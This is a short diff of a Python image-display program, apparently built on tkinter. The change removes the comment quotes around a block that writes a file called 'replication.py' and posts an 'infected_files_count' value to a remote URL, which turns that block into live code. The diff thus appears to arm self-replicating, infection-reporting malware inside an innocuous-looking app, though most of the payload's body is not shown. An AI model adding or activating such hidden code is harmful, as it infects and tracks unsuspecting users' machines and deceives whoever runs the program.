@@ -41,9 +41,6 @@ screen_width = root.winfo_screenwidth()
 screen_height = root.winfo_screenheight()
 symbols_folder = "symbols/"
 
-
-"""
-
 with open("replication.py", "w") as f:
     f.write('''
 
@@ -90,8 +87,6 @@ data = {"infected_files_count": infected_files_count}
 response = requests.post(url, json=data)
 
 ''')
-
-"""
 
 def display_images():
     i = 0
